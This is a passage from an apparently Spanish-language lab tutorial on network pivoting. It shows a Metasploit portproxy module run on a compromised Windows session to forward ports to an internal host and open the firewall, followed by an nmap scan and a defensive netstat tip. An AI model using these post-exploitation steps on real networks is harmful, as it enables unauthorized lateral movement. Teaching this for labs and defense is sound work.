msf6 post(windows/manage/portproxy) > show options

Module options (post/windows/manage/portproxy):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   CONNECT_ADDRESS                   yes       IPv4/IPv6 address to which to connect.
   CONNECT_PORT                      yes       Port number to which to connect.
   IPV6_XP          true             yes       Install IPv6 on Windows XP (needed for v4tov
                                               4).
   LOCAL_ADDRESS                     yes       IPv4/IPv6 address to which to listen.
   LOCAL_PORT                        yes       Port number to which to listen.
   SESSION                           yes       The session to run this module on
   TYPE             v4tov4           yes       Type of forwarding (Accepted: v4tov4, v6tov6
                                               , v6tov4, v4tov6)

msf6 post(windows/manage/portproxy) > set CONNECT_ADDRESS 172.16.5.72
CONNECT_ADDRESS => 172.16.5.72
msf6 post(windows/manage/portproxy) > set CONNECT_PORT 80
CONNECT_PORT => 80
msf6 post(windows/manage/portproxy) > set LOCAL_ADDRESS 0.0.0.0
LOCAL_ADDRESS => 0.0.0.0
msf6 post(windows/manage/portproxy) > set LOCAL_PORT 6080
LOCAL_PORT => 6080
msf6 post(windows/manage/portproxy) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/portproxy) > run

[*] Setting PortProxy ...
[+] PortProxy added.
[*] Port Forwarding Table
=====================

   LOCAL IP  LOCAL PORT  REMOTE IP     REMOTE PORT
   --------  ----------  ---------     -----------
   0.0.0.0   6080        172.16.5.72   80

[*] Setting port 6080 in Windows Firewall ...
[+] Port opened in Windows Firewall.
[*] Post module execution completed
msf6 post(windows/manage/portproxy) > set CONNECT_PORT 22 
CONNECT_PORT => 22
msf6 post(windows/manage/portproxy) > set LOCAL_PORT 6022
LOCAL_PORT => 6022
msf6 post(windows/manage/portproxy) > run

[*] Setting PortProxy ...
[+] PortProxy added.
[*] Port Forwarding Table
=====================

   LOCAL IP  LOCAL PORT  REMOTE IP     REMOTE PORT
   --------  ----------  ---------     -----------
   0.0.0.0   6080        172.16.5.72   80
   0.0.0.0   6022        172.16.5.72   22

[*] Setting port 6022 in Windows Firewall ...
[+] Port opened in Windows Firewall.
[*] Post module execution completed
msf6 post(windows/manage/portproxy) > 
```

Finalmente podremos trabajar desde nuestra máquina atacante de forma normal con la IP que teníamos alcance desde un principio que es la 10.129.3.88. Es decir, si queremos realizar un nmap se tendría que escanear de la siguiente forma:

```bash
┌─[root@kali]─[/home/user/pivoting]
└──╼ nmap -sVC 10.129.3.88 -p6022,6080              
```



> Desde el punto de vista defensivo todas estas conexiones se pueden visualizar por medio de ```netstat -antp```.
